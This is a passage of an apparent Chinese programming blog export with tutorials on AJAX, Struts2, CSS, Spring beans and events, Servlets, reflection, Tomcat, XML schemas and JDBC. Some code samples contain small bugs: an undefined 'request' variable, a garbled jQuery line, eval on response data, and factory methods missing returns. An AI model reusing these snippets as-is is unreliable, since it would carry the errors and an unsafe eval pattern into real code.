    <content type="text"><![CDATA[前言AJAX即Asynchronous Javascript And XML（异步JavaScript和XML），是指一种创建交互式网页应用的网页开发技术。AJAX = 异步 JavaScript和XML（标准通用标记语言的子集）。AJAX 是一种用于创建快速动态网页的技术。通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。传统的网页（不使用 AJAX）如果需要更新内容，必须重载整个网页页面。 获取XMLHttpRequest对象123456789101112131415function getXMLHttpRequest()&#123; var xhr; try&#123; xhr = new XMLHttpRequest();//firfox, Opera 8.0+, Safari &#125; catch(e) &#123; try&#123; xhr = new ActiveXObject('Msxml2.XMLHTTP'); &#125; catch(e)&#123; try&#123; xhr = new ActiveXObject('Microsoft.XMLHTTP'); &#125; catch(e)&#123;&#125; &#125; &#125; return xhr;&#125; 发送数据1234var xhr = getXMLHttpRequest();xhr.open('post', 'http://localhost:8080/test', true);//true是异步提交xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');//post提交表单必须xhr.send('username=张三&amp;sex=男'); 接收数据12345xhr.onreadystatechange = function()&#123; if(xhr.readyState===4 &amp;&amp; request.status===200)&#123; document.getElementById('id').innerHTML = xhr.responseText; &#125;&#125; jQuery实现AJAX1234567891011121314151617181920212223242526272829$(document).ready(function()&#123; $('#id').click(function()&#123; $.ajax(&#123; type: 'POST', contentType : 'application/json', async: true, timeout : 100000,url: _______url:_'http://localhost:8080/test', dataType: 'json', data:&#123; name:'张三', sex:'男' &#125;, beforeSend: function () &#123; alert('加载中'); &#125;, success: function (data) &#123; var json = eval(data); alert(json); &#125;, error: function (xhr) &#123; alert('失败'+xhr.status);//传入XMLHttpRequest对象 &#125;, done : function(e) &#123; console.log('DONE'); &#125; &#125;); &#125;);&#125;);]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Ajax</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Struts2学习总结]]></title>
    <url>%2Fposts%2FStruts2_summarize.html</url>
    <content type="text"><![CDATA[Action搜索顺序12345&lt;struts&gt; &lt;package name="default" namespace="/test"&gt; &lt;action name="myAction" /&gt; &lt;/package&gt;&lt;/struts&gt; 访问http://localhost:8080/test/aaa/bbb/ccc/myAction时，先查找ccc命名空间的包下有没有myAction。没有再找到bbb，再找aaa。都找不到myAction。这时找到test命名空间的包下，找到了myAction，搜索结束。如果还是没有找到myAction，则往默认命名空间下找，找不到抛出。 result的type属性12345678&lt;struts&gt; &lt;package name="default" namespace="/test"&gt; &lt;action name="myAction"&gt; &lt;result type="dispatcher"&gt;/index.jsp&lt;/result&gt; &lt;result name="error" type="redirect"&gt;/index.jsp?username=$&#123;username&#125;&lt;/result&gt; &lt;/action&gt; &lt;/package&gt;&lt;/struts&gt; 默认情况下是转发（dispatcher）。 重定向是redirect，可以用${username}传递Action中的属性，中文记得使用URLEncoder.encode(&quot;中文&quot;, &quot;UTF-8&quot;)。 重定向Action是redirectAction，在result标签下的namespace标签可以指定其他命名空间的Action。 查看源码是plainText，中文要在result标签加上&lt;param name=&quot;charSet&quot;&gt;UTF-8&lt;/param&gt;]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS背景]]></title>
    <url>%2Fposts%2Fcss_how_to_set_background.html</url>
    <content type="text"><![CDATA[设置纯色背景12345&lt;style type="text/css"&gt; body &#123; background-color:gray; &#125;&lt;/style&gt; 设置图片背景如果同时设置纯色背景和图片背景，则纯色背景在图片背景之下。并且图片背景会平铺整个屏幕。 background-repeat属性可以设置平铺方式，repeat-x、repeat-y、no-repeat。 background-position属性可以设置图片背景的位置。top、bottom等。 background-attachment属性可以设置图片是否随文档滚动。fixed、scroll。12345678&lt;style type="text/css"&gt; body &#123; background-image:url(http://cn.bing.com/sa/simg/CN_Logo_Gray.png); background-repeat:no-repeat; background-position:center; background-attachment:fixed; &#125;&lt;/style&gt;]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringBean详解]]></title>
    <url>%2Fposts%2FSpring_Bean.html</url>
    <content type="text"><![CDATA[前言在Spring中，类的创建不再由new进行，而是交给Spring通过xml文件进行反射创建，这种叫做控制反转IoC(Inversion of Control)，也叫做依赖注入DI(Dependency Injection)。 简单的Bean例子导入maven项目创建一个Person类，并在xml中配置bean信息12345678910&lt;?xml version="1.0" encoding="gbk"?&gt;&lt;beans xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://www.springframework.org/schema/beans" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"&gt; &lt;bean id="personId" class="com.ahao.javaeeDemo.Person"&gt; &lt;property name="name" value="张三" /&gt; &lt;property name="age" value="12"/&gt; &lt;/bean&gt;&lt;/beans&gt; 在测试类中通过ApplicationContext进行创建对象123456@Testpublic void testGetPerson()&#123; ApplicationContext ac = new ClassPathXmlApplicationContext("spring-bean.xml"); Person p1 = ac.getBean("personId", Person.class); System.out.println(p1.getName()+","+p1.getAge());&#125; Bean的生命周期 Bean先new进行实例化 然后注入属性。 若实现了BeanNameAware接口，将Bean的ID传入setBeanName()方法。 若实现了BeanFactoryAware接口，将BeanFactory容器实例传入setBeanFactory()方法。 若实现了ApplicationContextAware接口，通过setApplicationContext()方法获取应用上下文。 调用BeanPostProcessor后处理器的预初始化方法。 调用InitializingBean接口afterPropertiesSet()方法。 配置文件bean标签下的init-method属性指定的方法。 配置文件beans标签下的default-init-method全局属性指定的方法。 调用BeanPostProcessor后处理器的预初始化后方法。 使用Bean 调用DisposableBean接口destory方法。 配置文件bean标签下的destory-method属性指定的方法。 配置文件beans标签下的default-destory-method全局属性指定的方法。 Bean的创建Bean的创建都交由xml配置文件执行，获取Bean实例都是通过getBean方法进行。 普通new创建123&lt;beans&gt; &lt;bean id="person" class="com.ahao.javaeeDemo.bean.Person"/&gt;&lt;/beans&gt; 静态工厂创建需要一个静态工厂类1234567public class BeanFactory&#123; public static Person getPerson(String type)&#123; if(type.equals("chinese"))&#123; return new Chinese(); &#125; &#125;&#125; 在xml文件中配置，指定factory-method属性，获取实例用getBean()方法即可123456&lt;beans&gt; &lt;bean id="chinese" class="com.ahao.javaeeDemo.factory.PersonFactory" factory-method="getPerson"&gt; &lt;constructor-arg value="chinese" /&gt; &lt;property name="axe" ref="steelAxe"/&gt; &lt;/bean&gt;&lt;/beans&gt; 实例工厂创建需要一个工厂类，注意这里和静态工厂的不同是不用static修饰方法1234567public class BeanFactory&#123; public Person getPerson(String type)&#123; if(type.equals("chinese"))&#123; return new Chinese(); &#125; &#125;&#125; 在xml文件中配置，指定factory-method属性，获取实例用getBean()方法即可1234567&lt;beans&gt; &lt;bean id="personFactory" class="com.ahao.javaeeDemo.factory.PersonFactory" /&gt; &lt;bean id="chinese" factory-bean="personFactory" factory-method="getPerson"&gt; &lt;constructor-arg value="chinese" /&gt; &lt;property name="axe" ref="steelAxe"/&gt; &lt;/bean&gt;&lt;/beans&gt; 工厂Bean创建工厂Bean继承自FactoryBean123456789101112131415161718192021public class PersonFactory implements FactoryBean&lt;Person&gt; &#123; private Person person; @Override public Person getObject() throws Exception &#123; if(person == null)&#123; person = new Chinese(); &#125; return person; &#125; @Override public Class&lt;?&gt; getObjectType() &#123; return person.getClass(); &#125; @Override public boolean isSingleton() &#123; return true; &#125;&#125; 在spring-bean.xml中配置，获取BeanFactory时使用&amp;chinese123&lt;beans&gt; &lt;bean id="chinese" class="com.ahao.javaeeDemo.factory.PersonFactory" /&gt;&lt;/beans&gt; 和上面一样使用12345678@Testpublic void testEvent()&#123; ApplicationContext ac = new ClassPathXmlApplicationContext("spring-bean.xml"); Person p1 = ac.getBean("chinese", Person.class); p1.setAxe(new StoneAxe()); p1.useAxe(); System.out.print(ac.getBean("&amp;chinese"));//获取BeanFactory&#125; scope作用域在bean标签中的scope属性有五个值 singleton：单例模式，整个Spring容器中只有一个实例 prototype：原型模式，每次通过getBean方法都将产生一个新的实例 request：对每次request请求，都会产生一个新的实例 session：对每次session会话，都会产生一个新的实例 global session：spring-bean-scopes-session-and-globalsession其中request、session在Servlet2.4以上要在web.xml中配置Listener在Servlet2.4以下要在web.xml中配置Filter并且要导入maven项目12345678910111213&lt;web-app&gt; &lt;listener&gt;&lt;!--Servlet2.4以上--&gt; &lt;listener-class&gt;org.springframework.web.context.request.RequestContextListener&lt;/listener-class&gt; &lt;/listener&gt; &lt;filter&gt;&lt;!--Servlet2.4以下--&gt; &lt;filter-name&gt;requestContextFilter&lt;/filter-name&gt; &lt;filter-class&gt;org.springframework.web.filter.RequestContextFilter&lt;/filter-class&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;requestContextFilter&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt;&lt;/web-app&gt; 自动装配注入自动装配减少了配置文件的工作量，但降低了依赖关系的透明性和清晰性。显示指定的依赖会覆盖自动装配的依赖 byName规则在bean标签添加autowire=&quot;byName&quot;属性，当A类中有setB方法，且beans中有id为b的bean，则自动装配注入。1234&lt;beans&gt; &lt;bean id="person" class="com.ahao.javaeeDemo.bean.Person" autoWire="byName"/&gt; &lt;bean id="axe" class="com.ahao.javaeeDemo.bean.StoneAxe" /&gt;&lt;/beans&gt; byType规则在bean标签添加autowire=&quot;byType&quot;属性，当A类中有B类型的Field，且beans中只有一个B类型或者B的子类型的bean，则自动装配注入。如果有多个匹配的bean，则抛出异常，使用autowire-candidate=&quot;false&quot;即可忽略该bean。12345&lt;beans&gt; &lt;bean id="person" class="com.ahao.javaeeDemo.bean.Person" autoWire="byType"/&gt; &lt;bean class="com.ahao.javaeeDemo.bean.StoneAxe" /&gt; &lt;bean id="steelAxe" class="com.ahao.javaeeDemo.bean.SteelAxe" autowire-candidate="false"/&gt;&lt;/beans&gt;]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ApplicationContext的事件机制]]></title>
    <url>%2Fposts%2FThe_event_mechanism_of_ApplicationContext.html</url>
    <content type="text"><![CDATA[简单例子完成事件机制首先需要一个事件源和事件监听器ApplicationEvent事件和ApplicationListener监听器1234567891011public class SayEvent extends ApplicationEvent &#123; public void say()&#123; System.out.println(this.getSource()+" : hello world"); &#125;&#125;public class SayListener implements ApplicationListener&lt;SayEvent&gt; &#123; @Override public void onApplicationEvent(SayEvent sayEvent) &#123; sayEvent.say(); &#125;&#125; 并且要在xml文件中配置好ApplicationListener监听器123&lt;beans&gt; &lt;bean class="com.ahao.javaeeDemo.SayListener" /&gt;&lt;/beans&gt; 通过ApplicationContext发布事件123456@Testpublic void testEvent()&#123; ApplicationContext ac = new ClassPathXmlApplicationContext("spring-bean.xml"); SayEvent event = new SayEvent("由testEvent()发出"); ac.publishEvent(event);&#125; Spring的事件监听机制是观察者模式的实现。监听器可以监听任何事件。输出结果：由testEvent()发出 : hello world 内置事件Spring提供如下几个内置事件： ContextRefreshedEvent：ApplicationContext容器初始化或刷新时触发该事件。此处的初始化是指：所有的Bean被成功装载，后处理Bean被检测并激活，所有Singleton Bean 被预实例化，ApplicationContext容器已就绪可用 ContextStartedEvent：当使用ConfigurableApplicationContext(ApplicationContext的子接口）接口的start()方法启动ApplicationContext容器时触发该事件。容器管理声明周期的Bean实例将获得一个指定的启动信号，这在经常需要停止后重新启动的场合比较常见 ContextClosedEvent：当使用ConfigurableApplicationContext接口的close()方法关闭ApplicationContext时触发该事件 ContextStoppedEvent：当使用ConfigurableApplicationContext接口的stop()方法使ApplicationContext容器停止时触发该事件。此处的停止，意味着容器管理生命周期的Bean实例将获得一个指定的停止信号，被停止的Spring容器可再次调用start()方法重新启动 RequestHandledEvent：Web相关事件，只能应用于使用DispatcherServlet的Web应用。在使用Spring作为前端的MVC控制器时，当Spring处理用户请求结束后，系统会自动触发该事件。 参考资料 Spring中ApplicationContext的事件机制]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Servlet基本使用]]></title>
    <url>%2Fposts%2FServlet_usage.html</url>
    <content type="text"><![CDATA[介绍Servlet是用Java编写的服务器端程序。其主要功能在于交互式地浏览和修改数据，生成动态Web内容。狭义的Servlet是指Java语言实现的一个接口，广义的Servlet是指任何实现了这个Servlet接口的类，一般情况下，人们将Servlet理解为后者。 使用 实现javax.servlet.Servlet接口 继承javax.servlet.GenericServlet抽象类（实现了Servlet接口） 继承javax.servlet.http.HttpServlet类（继承自toGenericServlet类）（推荐） 先写一个类继承自HttpServlet1234567891011public class Person extends HttpServlet &#123; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; //处理get请求 &#125; @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; //处理post请求 &#125;&#125; 并在web.xml中配置Servlet，对应在ServletConfig类中12345678910111213141516171819&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd" version="3.1"&gt; &lt;servlet&gt; &lt;servlet-name&gt;myServlet&lt;/servlet-name&gt; &lt;!--自己命名的Servlet名称--&gt; &lt;servlet-class&gt;com.ahao.javaeeDemo.MyServlet&lt;/servlet-class&gt; &lt;!--Servlet所对应的类，用于反射创建--&gt; &lt;load-on-startup&gt;0&lt;/load-on-startup&gt; &lt;!--服务器开始就创建Servlet，整型数代表加载优先级--&gt; &lt;init-param&gt; &lt;!--一个参数对应一个init-param标签--&gt; &lt;param-name&gt;myParam&lt;/param-name&gt; &lt;!--初始化参数名--&gt; &lt;param-value&gt;第一个参数&lt;/param-value&gt; &lt;!--初始化参数值--&gt; &lt;/init-param&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;myServlet&lt;/servlet-name&gt; &lt;!--自己命名的Servlet名称--&gt; &lt;url-pattern&gt;/myServlet&lt;/url-pattern&gt; &lt;!--访问Servlet的url路径，可以设置多个--&gt; &lt;/servlet-mapping&gt;&lt;/web-app&gt; web.xml介绍所有项目的web.xml都有一个父的web.xml，位于Tomcat/conf/web.xml其中有两个默认的Servlet default：解析/的url地址，即所有servlet都不匹配时，执行default，返回404等各种错误 jsp：解析jsp后缀的url地址 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;web-app&gt; &lt;!--==================default Servlet======================--&gt; &lt;servlet&gt; &lt;servlet-name&gt;default&lt;/servlet-name&gt; &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;debug&lt;/param-name&gt; &lt;param-value&gt;0&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;listings&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;default&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;!--==================default Servlet======================--&gt; &lt;!--==================JSP Servlet======================--&gt; &lt;servlet&gt; &lt;servlet-name&gt;jsp&lt;/servlet-name&gt; &lt;servlet-class&gt;org.apache.jasper.servlet.JspServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;fork&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;xpoweredBy&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;3&lt;/load-on-startup&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;jsp&lt;/servlet-name&gt; &lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt; &lt;url-pattern&gt;*.jspx&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;!--==================JSP Servlet======================--&gt;&lt;/web-app&gt;]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Servlet</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[反射详解]]></title>
    <url>%2Fposts%2FJava_Reflection.html</url>
    <content type="text"><![CDATA[前言学习框架底层必须要掌握反射。1234567891011121314public class Person &#123; /** 属性 */ private String name; private int age; /** 构造器 */ public Person()&#123; &#125; public Person(String name, int age) &#123; this.name = name; this.age = age; &#125; /** getter And Setter */&#125; 获取类对象的三种方法1234567@Testpublic void testClass() throws ClassNotFoundException &#123; Class c1 = Person.class; Class c2 = new Person().getClass(); Class c3 = Class.forName("com.ahao.javaeeDemo.Person"); System.out.print(c1+"\n"+c2+"\n"+c3);&#125; 通过反射创建对象12345678910@Testpublic void testNew() throws ClassNotFoundException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException &#123; Class clazz = Class.forName("com.ahao.javaeeDemo.Person"); Person p1 = (Person) clazz.newInstance(); System.out.println("无参构造方法："+p1.toString()); Person p2 = (Person) clazz.getConstructor(String.class, int.class).newInstance("张三", 12); System.out.println("有参构造方法："+p2.toString());&#125; 操作Field123456789101112@Testpublic void testField() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, InstantiationException &#123; Class clazz = Class.forName("com.ahao.javaeeDemo.Person"); Person p1 = (Person) clazz.newInstance(); Field name = clazz.getDeclaredField("name");//获取一个自己声明的Field，要访问父类Field要用getField() name.setAccessible(true);//默认只能操作public，如果要操作其他权限，需要使用这个方法 name.set(p1, "张三");//相当于p1.name = "张三" System.out.println(p1.toString());&#125; 操作Method12345678910111213@Testpublic void testMethod() throws ClassNotFoundException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException &#123; Class clazz = Class.forName("com.ahao.javaeeDemo.Person"); Person p1 = (Person) clazz.newInstance(); Method method = clazz.getDeclaredMethod("setName", String.class);//获取一个自己声明的Method，要访问父类Field要用getMethod() method.setAccessible(true);//默认只能操作public，如果要操作其他权限，需要使用这个方法 method.invoke(p1, "张三");//相当于p1.setName("张三") System.out.println(p1.toString()); //method.invoke(null, args);//当对象为null时，操作static方法&#125;]]></content>
      <categories>
        <category>Java SE</category>
      </categories>
      <tags>
        <tag>反射</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Tomcat常用操作]]></title>
    <url>%2Fposts%2FTomcat_common_setting.html</url>
    <content type="text"><![CDATA[更改端口号Tomcat默认端口号为8080，在Tomcat目录的/conf/server.xml中配置。找到如下代码，将8080改为想要修改的端口号即可1234567&lt;Service name="Catalina"&gt;&lt;!--省略无关代码--&gt;&lt;Connector port="8080" protocol="HTTP/1.1" connectionTimeout="20000" redirectPort="8443" /&gt;&lt;!--省略无关代码--&gt;&lt;/Service&gt; 外部应用Tomcat默认应用在webapps文件夹中，如果在外部编写javaweb应用，需要在/conf/server.xml编写代码，或者/conf/Catalina/localhost中创建xml文件。在地址栏输入对应url即可访问。 在server.xml中配置123456789&lt;Service name="Catalina"&gt;&lt;Engine name="Catalina" defaultHost="localhost"&gt; &lt;Host name="localhost" appBase="webapps" unpackWARs="true" autoDeploy="true"&gt; &lt;!-- &lt;Context path="url路径名" docBase="实际项目在磁盘中地址" /&gt; --&gt; &lt;Context path="helloWorld" docBase="C:/HelloWorld" /&gt; &lt;/Host&gt;&lt;/Engine&gt;&lt;/Service&gt; 在catalina/localhost中配置创建一个以url路径名命名的xml文件helloWorld.xml1&lt;Context docBase="C:/HelloWorld" /&gt; 映射虚拟主机浏览器使用80端口，如http://www.test.com和http://www.test.com:80等价。在%windir%\system32\drivers\etc\hosts中添加127.0.0.1 http://www.test.com在server.xml中配置新的host信息1234567&lt;Service name="Catalina"&gt;&lt;Engine name="Catalina" defaultHost="localhost"&gt; &lt;Host name="www.test.com" appBase="C:/helloworld" unpackWARs="true" autoDeploy="true"&gt; &lt;/Host&gt;&lt;/Engine&gt;&lt;/Service&gt;]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XML语法详解]]></title>
    <url>%2Fposts%2FXML_syntax.html</url>
    <content type="text"><![CDATA[声明目前XML有1.0和1.1两个版本，但是1.1不向下兼容，常用的是1.0版本只能有一个根标签元素12&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;person&gt;&lt;/person&gt; CDATA区语法&lt;![CDATA[内容]]&gt;，解决频繁转义字符的问题，当成文本内容1234&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;person&gt; &lt;code&gt;&lt;![CDATA[(1&lt;2)&amp;&amp;(2&lt;3)?true:false;]]&gt;&lt;/code&gt;&lt;/person&gt; PI指令设置XML样式语法&lt;?xml-stylesheet type=&quot;text/css&quot; href=&quot;test.css&quot;?&gt;将css样式应用于XML文档 xml约束限制xml中出现的标签名 dtd约束dtd引入方式1234&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE 根元素名 SYSTEM "dtd路径"&gt; &lt;!--第一种，外部引用本地dtd--&gt;&lt;!DOCTYPE 根元素名 [约束内容]&gt; &lt;!--第二种，内部引用dtd--&gt;&lt;!DOCTYPE 根元素名 PUBLIC "dtd名称" "dtd的url路径"&gt; &lt;!--第三种，外部引用网络dtd--&gt; dtd语法先创建一个DTD文件personDTD.dtd， 元素的语法格式为&lt;!ELEMENT 元素名 ([子元素名|#PCDATA|EMPTY|ANY])(+|*|?)&gt; 属性的语法格式为&lt;!ATTLIST 元素名 属性名 属性类型 约束&gt; 实体的语法格式为&lt;!ENTITY 实体名 实体值&gt; 1234567891011121314151617&lt;!--定义元素-&gt;&lt;!ELEMENT person (name+, age?)&gt;&lt;!--含有子元素的元素，+出现不少于一次，？出现不多于一次，*出现任意多次--&gt;&lt;!ELEMENT person (name | age)&gt;&lt;!--含有子元素的元素，表示只能出现一个nama或者age&lt;!ELEMENT name (#PCDATA)&gt;&lt;!--不含有子元素的元素--&gt;&lt;!ELEMENT isMan EMPTY&gt;&lt;!--不含有内容的元素--&gt;&lt;!ELEMENT school ANY&gt;&lt;!--任意的元素--&gt;&lt;!--定义属性--&gt;&lt;!ATTLIST name nameAttr CDATA #REQUIRED &lt;!--CDATA是字符串，#REQUIRED是必须出现--&gt; pid ID #REQUIRED &lt;!--ID是只能字母和下划线开头--&gt; sex CDATA "男" &lt;!--直接在后面加上字符串，表示默认值--&gt;&gt; &lt;!ATTLIST food like (苹果|香蕉|橘子) #IMPLIED&gt; &lt;!--枚举，#IMPLIED是可有可无--&gt;&lt;!ATTLIST school CDATA #FIXED "学校"&gt; &lt;!--固定值，#FIXED只能选择固定属性值--&gt;&lt;!--定义实体--&gt;&lt;!ENTITY copyright "版权所有不得抄袭"&gt;&lt;!--在xml中可用&amp;copyright;引用该实体--&gt; 示例1234567&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE person SYSTEM "personDTD.dtd"&gt;&lt;person&gt; &lt;name&gt;张三&lt;/name&gt; &lt;age&gt;20&lt;/age&gt; &lt;!-- &lt;error&gt;编译出错&lt;/error&gt; --&gt;&lt;/person&gt; schema约束schema是xml格式的一个约束文件。需要先在命名空间引入http://www.w3.org/2001/XMLSchema，在targetNamespace中定义schema的引用地址名，用于在xml文件中引入。和xml文件类似，每个子元素都在父元素之中。123456789101112131415161718192021&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;schema xmlns="http://www.w3.org/2001/XMLSchema" targetNamespace="http://mySchemaUrl" elementFormDefault="qualified"&gt; &lt;element name="store"&gt; &lt;complexType&gt;&lt;!--表示store元素有子元素--&gt; &lt;sequence&gt;&lt;!--子元素严格按顺序显示--&gt; &lt;element name="book" maxOccurs="unbounded"&gt; &lt;complexType&gt; &lt;sequence&gt; &lt;element name="name" type="string" maxOccurs="unbounded"/&gt;&lt;!--maxOccurs表示元素出现次数--&gt; &lt;/sequence&gt; &lt;attribute name="id" type="int" use="required"/&gt;&lt;!--book的属性，必须在最后声明--&gt; &lt;/complexType&gt; &lt;/element&gt; &lt;/sequence&gt; &lt;/complexType&gt; &lt;/element&gt;&lt;/schema&gt; 在xml中引入时，先引入别名为xsi的http://www.w3.org/2001/XMLSchema-instance命名空间，再引入自定义schema的引用地址，及schema文件名12345678910111213&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;store xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://mySchemaUrl" xsi:schemaLocation="http://mySchemaUrl 1.xsd"&gt; &lt;book id="01"&gt; &lt;name&gt;第一本书&lt;/name&gt; &lt;/book&gt; &lt;book id="02"&gt; &lt;name&gt;第二本书&lt;/name&gt; &lt;name&gt;第三本书&lt;/name&gt; &lt;/book&gt;&lt;/store&gt;]]></content>
      <categories>
        <category>编程杂谈</category>
      </categories>
      <tags>
        <tag>XML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS选择器]]></title>
    <url>%2Fposts%2Fcss_selector.html</url>
    <content type="text"><![CDATA[基本选择器标签元素选择器1234div &#123; background-color:red; color:white;&#125; class类选择器以.开头12345div.test1&#123; // 满足class为test1，且标签为div的形式，div可省略 background-color:red; color:white;&#125;// &lt;div class="test1"&gt;测试&lt;/div&gt; ID选择器以#开头12345div#test2 &#123; // 满足id为test2，且标签为div的形式，div可省略 background-color:red; color:white;&#125;// &lt;div id="test2"&gt;测试&lt;/div&gt; 扩展选择器属性选择器格式元素名[属性名]{样式}给拥有某个属性的元素标签设置特定样式12a[href][title] &#123;color:red;&#125;a[href="http://www.w3school.com.cn/about_us.asp"] &#123;color: red;&#125; 关联选择器在标签嵌套时使用，比如特定div标签中的p标签12345div p &#123; /* 用空格隔开 */ background-color:red; color:white;&#125;/* &lt;div&gt;&lt;p&gt;测试&lt;/p&gt;&lt;/div&gt; */ 组合选择器把不同标签设置相同的样式12345div,p &#123; /* 用,隔开 */ background-color:red; color:white;&#125;/* &lt;div&gt;测试&lt;/div&gt;&lt;p&gt;测试&lt;/p&gt; */ 伪元素选择器伪类选择器]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS基础]]></title>
    <url>%2Fposts%2Fcss_foundation.html</url>
    <content type="text"><![CDATA[语法格式为属性名:属性值;1&lt;div style="background-color:red;color:white;"&gt;测试&lt;/div&gt; 测试 优先级由上到下，由外到内，优先级由低到高。style &gt; id选择器 &gt; class类选择器 &gt; 标签选择器，优先级由低到高 引入方式1234567891011121314151617&lt;html&gt;&lt;head&gt; &lt;style type="test/css"&gt; div &#123; background-color:red; color:white; &#125; &lt;/style&gt; &lt;style type="test/css"&gt; @import url(div.css);&lt;!--外部引用，兼容性差，不使用--&gt; &lt;/style&gt; &lt;link rel="stylesheet" type="text/css" href="div.css"/&gt;&lt;!--外部引用--&gt;&lt;/head&gt;&lt;body&gt; &lt;div style="background-color:red;color:white;"&gt;测试&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JDBC简单使用]]></title>
    <url>%2Fposts%2FJDBC_simple_use.html</url>
    <content type="text"><![CDATA[连接数据库先下载jar包 ，或者导入maven 1234567891011121314151617181920212223242526272829303132333435363738394041public class JDBCTest &#123;// private static final String driver = "com.mysql.jdbc.Driver";//已过时 private static final String driver = "com.mysql.cj.jdbc.Driver"; private static final String username = "root"; private static final String password = "root"; private static final String schema = "test"; private static final int port = 3306; private static final String url = "jdbc:mysql://localhost:" + port + "/" + schema+"?serverTimezone=GMT&amp;useUnicode=true&amp;characterEncoding=utf8"; //最好使用properties文件存储配置信息，或者使用数据库连接池 private static Connection conn;//建立连接 @BeforeClass public static void initJDBC() throws Exception &#123; Class.forName(driver);//加载驱动 conn = DriverManager.getConnection(url, username, password);//建立数据库连接 &#125; @Test public void testRead() &#123; try (Statement s = conn.createStatement(); ResultSet rs = s.executeQuery("SELECT * FROM stu;")//查询数据表返回结果集 ) &#123; ResultSetMetaData rsmd = rs.getMetaData();//获取结果集的元数据 while (rs.next()) &#123;//如果有下一条记录 for (int i = 1; i &lt;= rsmd.getColumnCount(); i++) &#123; System.out.print(rs.getString(i)+"\t");//将每列打印输出 &#125; System.out.print("\n"); &#125; &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125; @AfterClass public static void destoryJDBC() throws Exception &#123; conn.close();//释放连接 &#125;&#125; 执行SQL语句的StatementStatement的基本用法123456789101112131415161718192021222324252627282930313233343536373839public class JDBCTest &#123; //省略初始化代码 @Test public void testExecuteUpdate()&#123; try(Statement s = conn.createStatement(); )&#123; s.executeUpdate("CREATE TABLE stu(" + "sid INT UNSIGNED PRIMARY KEY AUTO_INCREMENT," + "sname VARCHAR(20)," + "age INT ," + "tid INT )"); System.out.println("共有"+0+"条记录受影响");//执行DDL语句时返回0 int records = s.executeUpdate("UPDATE stu SET age=age+1"); System.out.println("共有"+records+"条记录受影响");//执行DML语句时返回受影响记录数目 &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125; @Test public void testExecute()&#123; 